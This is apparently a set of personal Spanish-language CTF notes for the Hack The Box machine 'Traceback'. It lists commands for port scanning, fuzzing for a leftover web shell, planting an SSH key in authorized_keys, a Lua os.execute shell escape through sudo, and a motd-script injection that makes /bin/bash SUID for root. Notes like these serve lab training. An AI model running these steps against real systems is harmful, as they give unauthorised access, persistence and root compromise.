# Traceback

ping: 10.10.10.181

## Ver si esta activa
❯ ping -c 1 10.10.10.181 
PING 10.10.10.181 (10.10.10.181) 56(84) bytes of data.
64 bytes from 10.10.10.181: icmp_seq=1 ttl=63 time=37.5 ms

--- 10.10.10.181 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 37.462/37.462/37.462/0.000 ms


## Escaneo de puertos

nmap -p- --open -T5 -v -n 10.10.10.181 -oN allPorts 
nmap -sC -sV -p22,80 10.10.10.181 -oN targetedPorts


## Informacion web
whatweb http://10.10.10.181

nmap --script http-enum -p80 10.10.10.181 -oN webScan

Desde el navegador miramos si hay robots.txt
CTRL+U para ver el codigo fuente de la pagina
Buscar en google el comentario

curl -s "https://github.com/TheBinitGhimire/Web-Shells" | html2text | grep -oP '^\w.*\.-php$' > wqbShells_path

wfuzz -c --hc=404 -w wqbShells_path http://10.10.10.181/FUZZ

## Entramos con el resultado

webadmin y buscamos ssh
borramos authorized_keys
ssh-keygen --> sin pass
mv id_rsa.pub authorized_keys
Subimos la ssh

ssh webadmin@10.10.10.181
whoami
ls
cat note.txt
id
sudo -l
sudo -u sysadmin/home/sysadmin/luvit

gtfobins.github.io --> buscar LUA

os.execute("/bin/bash")
whoami
cd /home
cd /sysadmin
ls
head -c 18 user.txt; echo
cd /root

## Escalada privilegios
ls -lha
cat .bash_history
uname -a
lsb_release -a 
grep -r -i "OWNED BY XH4H" 2>/dev/null
find . \-group sysadmin 2>/dev/null | grep -v "proc"
cat /etc/update-motd.d/00
grep -r -i "Wellcome to Xh4H land" 2>/dev/null
añadimos al script --> chmod 4755 /bin/bash
exit
ssh sysadmin@10.10.10.181
ls -l /bin/bash
bash -p --> ganar privilegios
whoami
cd /root

